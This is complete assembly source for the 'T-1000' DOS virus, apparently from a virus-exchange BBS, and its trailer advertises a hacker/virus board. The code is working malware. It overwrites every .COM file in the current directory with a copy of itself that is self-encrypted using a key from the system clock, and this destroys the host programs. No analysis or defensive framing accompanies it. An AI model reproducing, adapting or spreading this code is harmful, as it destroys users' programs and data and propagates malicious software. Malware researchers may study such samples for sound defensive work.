;
;       T-1000 Virus
;
; This virus is a Non-Resident Overwriting Self-Encrypting .COM File Inctector.
; When an infected program is started, the virus will infect all files in the
; current directory and use the time counter for its encryption. It displays
; the text "T-1000" when it is ready infecting.

Code    Segment para 'code'
        Assume Cs:Code,Ds:Code

Length  Equ Offset EndByte-Offset Main

        Org 100h

Main:   Mov Si,Offset Decrypt
        Mov Di,Si
        Mov Cl,Offset EndByte-Offset Decrypt
On2:    Lodsb
        Db 34h
Crypt   Db 0
        Stosb
        Dec Cl
        Cmp Cl,0ffh
        Jne On2

Decrypt:
        Mov Ah,4eh
        Push Ax

Encr:
        Mov Ah,2ch
        Int 21h
        Mov Crypt,Dl
        Mov Si,Offset Decrypt
        Mov Di,Offset EndByte+10
        Mov Cx,Offset EndByte-Offset Decrypt
On3:    Lodsb
        Xor Al,Crypt
        Stosb
        Dec Cx
        Cmp Cx,0ffffh
        Jne On3

        Pop Ax
On1:    Xor Cx,Cx
        Mov Dx,Offset Nam
        Int 21h
        Jc  Einde

        Mov Ax,3d01h
        Mov Dx,9eh
        Int 21h
        Mov Bx,Ax

        Mov Ah,40h
        Push Ax
        Mov Cx,Offset Decrypt-Offset Main
        Mov Dx,Offset Main
        Int 21h

        Pop Ax
        Mov Cx,Offset EndByte-Offset Decrypt
        Mov Dx,Offset EndByte+10
        Int 21h

        Mov Ah,3eh
        Int 21h

        Mov Ah,4fh
        Push Ax
        Jmp Short Encr

Einde:
        Mov Ah,9
        Mov Dx,Offset Msg
        Push Cs
        Pop Ds
        Int 21h
        Int 20h

Msg     Db 'T-1000$'

Nam     Db '*.Com',0

EndByte Db 0

Code    Ends
        End Main


;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
